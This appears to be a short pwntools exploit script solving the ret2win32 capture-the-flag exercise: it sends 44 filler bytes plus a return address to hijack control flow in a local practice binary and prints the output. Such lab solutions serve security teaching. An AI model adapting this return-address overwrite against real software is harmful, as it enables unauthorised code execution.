#!/usr/bin/env python3
from pwn import *

buffer_overflow = 44

ret2win = 0x0804862c

payload = (b"A" * buffer_overflow + p32(ret2win))

p = process("./ret2win32")
p.sendline(payload)
print(p.recvall(timeout=2).decode(errors='ignore'))
